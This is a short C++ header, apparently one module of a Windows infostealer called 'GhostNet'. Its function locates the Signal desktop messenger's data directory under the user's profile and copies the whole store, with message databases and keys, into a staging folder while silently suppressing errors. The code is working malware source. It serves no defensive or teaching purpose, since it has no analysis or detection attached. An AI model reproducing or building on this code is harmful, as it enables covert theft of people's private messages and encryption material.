#pragma once
// signal.h
#ifndef SIGNAL_HPP
#define SIGNAL_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include <windows.h>

namespace fs = std::filesystem;

namespace Signal {
    inline void ExtractSignalData(const std::string& ghostNetPath) {
        // Get user profile path
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) return;

        std::string signalDir = std::string(userProfile) + "\\AppData\\Roaming\\Signal";

        // Check if Signal is installed
        if (!fs::exists(signalDir)) return;

        // Create Signal folder in GhostNet directory
        std::string targetDir = ghostNetPath + "\\Signal";
        CreateDirectoryA(targetDir.c_str(), NULL);

        try {
            // Copy all Signal data recursively
            for (const auto& entry : fs::recursive_directory_iterator(signalDir, fs::directory_options::skip_permission_denied)) {
                std::string relativePath = fs::relative(entry.path(), signalDir).string();
                std::string destPath = targetDir + "\\" + relativePath;

                if (fs::is_directory(entry)) {
                    CreateDirectoryA(destPath.c_str(), NULL);
                }
                else {
                    // Create parent directories if needed
                    fs::path destDir = fs::path(destPath).parent_path();
                    fs::create_directories(destDir);
                    CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
                }
            }
        }
        catch (const std::exception& e) {
            // Silently handle errors
        }
    }
}

#endif // SIGNAL_HPP